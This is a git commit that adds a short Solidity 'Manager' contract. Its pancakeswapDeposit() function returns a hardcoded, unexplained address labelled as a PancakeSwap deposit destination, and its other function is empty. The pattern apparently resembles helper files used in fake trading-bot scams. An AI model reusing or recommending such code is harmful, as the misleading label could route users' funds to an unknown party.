450aca57d76c6c5dd0ef7853884f526805eea976
pancakeswap-address <thanhnhandinh@gmail.com>
2022-07-27 19:01:26 +0700

    first commit

---
+++ IPancakeContract.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0x41D683d48f674811e1c50f10d3E3e65E1bF1C3e2;
+	}
+	
+}
